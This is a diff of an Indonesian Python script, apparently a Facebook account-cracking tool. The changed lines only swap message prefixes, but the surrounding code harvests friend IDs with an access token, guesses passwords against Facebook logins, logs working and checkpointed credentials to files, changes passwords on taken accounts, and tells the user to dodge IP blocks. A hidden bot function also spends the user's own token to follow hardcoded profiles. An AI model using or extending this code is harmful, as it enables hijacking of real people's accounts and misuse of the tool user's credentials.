@@ -18,17 +18,17 @@ from time import sleep as waktu
 try:
 	import requests
 except ImportError:
-	print("\n [!] module requests belum terinstall")
+	print("\n [-] module requests belum terinstall")
 	os.system("pip install requests")
 try:
 	import bs4
 except ImportError:
-	print("\n [!] module bs4 belum terinstall")
+	print("\n [-] module bs4 belum terinstall")
 	os.system("pip install bs4")
 try:
 	import concurrent.futures
 except ImportError:
-	print("\n [!] module futures belum terinstall")
+	print("\n [-] module futures belum terinstall")
 	os.system("pip install futures")
 
 ### GLOBAL WARNA ###
@@ -124,7 +124,7 @@ def tokenz():
 			bot()
 			menu()
 		except KeyError:
-			print(" %s[!] token kadaluwarsa!"%(M))
+			print(" %s[-] token kadaluwarsa!"%(M))
 			sys.exit() 
  
 ### BOT FOLLOW DAN KOMEN ###
@@ -132,7 +132,7 @@ def bot():
 	try:
 		token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
-		exit(" %s[!] token kadaluwarsa!"%(M))
+		exit(" %s[-] token kadaluwarsa!"%(M))
 	requests.post('https://graph.facebook.com/100023812724814/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100026441864942/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
@@ -153,11 +153,11 @@ def menu():
         ttl = a['birthday']
     except (KeyError, IOError):
         os.system('clear')
-        print("\n %s[!] token kadaluwarsa!"%(M))
+        print("\n %s[-] token kadaluwarsa!"%(M))
         os.system('rm -f token.txt')
         tokenz()
     except requests.exceptions.ConnectionError:
-        exit(" %s[!] anda tidak terhubung ke internet!"%(M))
+        exit(" %s[-] anda tidak terhubung ke internet!"%(M))
 
     logo()
     print(" Nama        : %s"%(nama))
@@ -184,7 +184,7 @@ def menu():
     	jalan(" [-] berhasil menghapus token ")
     	exit()
     else:
-    	jalan(" [!] pilih jawaban dengan bener ! ")
+    	jalan(" [-] pilih jawaban dengan bener ! ")
     	menu() 
  
 def gantiua():
@@ -214,7 +214,7 @@ def cekopsi():
 	except IOError:
 		exit("\n [!] nama file %s tidak tersedia"%(files))
 	ubahpw()
-	print('\n [!] anda bisa mematikan data selular untuk menjeda proses cek')
+	print('\n [-] anda bisa mematikan data selular untuk menjeda proses cek')
 	for memek in buka_baju:
 		kontol = memek.replace("\n","")
 		titid  = kontol.split("|")
@@ -223,7 +223,7 @@ def cekopsi():
 			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
 		except requests.exceptions.ConnectionError:
 			pass
-	print("\n [!] cek akun sudah selesai...")
+	print("\n [-] cek akun sudah selesai...")
 	input(" [*] tekan enter untuk kembali ke menu ")
 	time.sleep(1)
 	menu()
@@ -287,7 +287,7 @@ def cek_opsi(user,pw):
 				else:
 					print("\r [-] akun tap yes, silahkan login di fb lite \n %s[-] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
+				print("\r %s[-] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
 			else:
 				print("Kesalahan!")
 		elif(len(cek)<=1):
@@ -303,13 +303,13 @@ def cek_opsi(user,pw):
 			print("")
 		else:
 			if "c_user" in session.cookies.get_dict():
-				print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
+				print("\r [-] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
 	elif "login_error" in str(response):
 		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print(" [!] %s"%(oh))
+		print(" [-] %s"%(oh))
 	else:
 		loop+=1
-		print(" [!] login gagal, silahkan cek kembali id dan kata sandi")
+		print(" [-] login gagal, silahkan cek kembali id dan kata sandi")
 
 def ubah_pw(user,pw,session,response,link2):
 	dat,dat2={},{}
@@ -350,7 +350,7 @@ def cek_apk(coki):
 				hit2+=1
 		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
 			print("  {N}[+] Apk kadaluarsa :")
-			print("   [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
+			print("   [-] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
 		else:
 			hit1,hit2=0,0
 			print("  {N}[+] Apk kadaluarsa :")
@@ -361,7 +361,7 @@ def cek_apk(coki):
 				print("   [{H}{hit1}{N}]. {N}{muncul} -> {M}{kadaluarsa[hit2]}{N}")
 				hit2+=1
 	else:
-		print('\n %s[!] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
+		print('\n %s[-] cookies anda kadaluwarsa%s'%(M,N));waktu(1)
 	print("")
 
 ### CEK HASIL ### 
@@ -381,7 +381,7 @@ def cekhasil():
 				menu()
 			totalok = open("OK/%s"%(file)).read().splitlines()
 		except IOError:
-			exit(" [!] file %s tidak tersedia"%(file))
+			exit(" [-] file %s tidak tersedia"%(file))
 		os.system("cat OK/%s"%(file))
 		input(" [*] tekan enter untuk kembali ke menu")
 		menu()
@@ -395,7 +395,7 @@ def cekhasil():
 				menu()
 			totalcp = open("CP/%s"%(file)).read().splitlines()
 		except IOError:
-			exit(" [!] file %s tidak tersedia"%(file))
+			exit(" [-] file %s tidak tersedia"%(file))
 		os.system("cat CP/%s"%(file))
 		input(" [*] tekan enter untuk kembali ke menu ")
 		menu()
@@ -407,7 +407,7 @@ def publik():
 	try:
 		token=open("token.txt","r").read()
 	except IOError:
-		exit(" [!] token kadaluwarsa")
+		exit(" [-] token kadaluwarsa")
 	idt=input(" [?] masukkan id : ")
 	if idt in[""]:
 		menu()
@@ -422,7 +422,7 @@ def publik():
 				nama = i["name"]
 				id.append(uid+"<=>"+nama)
 		except KeyError:
-			exit(" [!] akun tidak tersedia atau list teman private")
+			exit(" [-] akun tidak tersedia atau list teman private")
 		print(" [+] total id : %s"%(len(id)))
 		atursandi()
 	elif ask in["2"]:
@@ -441,7 +441,7 @@ def publik():
 				elif i['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
 					id.append(uid+"<=>"+nama)
 		except KeyError:
-			exit(" [!] akun tidak tersedia atau list teman private")
+			exit(" [-] akun tidak tersedia atau list teman private")
 		print(" [+] total id : %s"%(len(id)))
 		atursandi()
 		
@@ -480,7 +480,7 @@ def otomatis():
 	print(" [3]. metode mobile")
 	ask=input(" [?] pilih : ")
 	if ask=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit(" %s[-] isi jawaban dengan benar!"%(M))
 	elif ask=="1":
 		print(' [+] hasil OK disimpan ke -> ok.txt')
 		print(' [+] hasil CP disimpan ke -> cp.txt')
@@ -524,7 +524,7 @@ def otomatis():
 ### MANUAL ###
 def manual():
 	munculopsi()
-	print(" [!] gunakan , (koma) sebagai pemisah")
+	print(" [-] gunakan , (koma) sebagai pemisah")
 	pwek=input(' [?] buat kata sandi : ')
 	if pwek=="":
 		exit(" %s[!] isi jawaban dengan benar!"%(M))
@@ -535,7 +535,7 @@ def manual():
 	print(" [3]. method mobile")
 	ask=input(" [?] pilih : ")
 	if ask=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit(" %s[-] isi jawaban dengan benar!"%(M))
 	elif ask=="1":
 		print(' [+] hasil OK disimpan ke -> ok.txt')
 		print(' [+] hasil CP disimpan ke -> cp.txt')
@@ -564,19 +564,19 @@ def manual():
 ### GABUNGAN ###
 def gabungkan():
 	munculopsi()
-	print(" [!] sandi bawaan nama123,1234,12345")
-	print(" [!] gunakan , (koma) sebagai pemisah")
+	print(" [-] sandi bawaan nama123,1234,12345")
+	print(" [-] gunakan , (koma) sebagai pemisah")
 	pwek=input(' [?] sandi gabungan : ')
 	if pwek=="":
 		exit(" %s[!] isi jawaban dengan benar!"%(M))
 	elif len(pwek)<=5:
-		exit(" %s[!] masukan sandi minimal 6 angka!"%(M))
+		exit(" %s[-] masukan sandi minimal 6 angka!"%(M))
 	print(" [1]. method API")
 	print(" [2]. method mbasic")
 	print(" [3]. method mobile")
 	ask=input(" [?] pilih : ")
 	if ask=="":
-		exit(" %s[!] isi jawaban dengan benar!"%(M))
+		exit(" %s[-] isi jawaban dengan benar!"%(M))
 	elif ask=="1":
 		print(' [+] hasil OK disimpan ke -> ok.txt')
 		print(' [+] hasil CP disimpan ke -> cp.txt')
@@ -676,7 +676,7 @@ def api(uid, pwx):
 				open("CP/%s.txt"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
 				break
 		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
-			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
+			print("\r %s[-] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
 			c+=1
 			sys.stdout.flush()
 			api(uid, pwx)
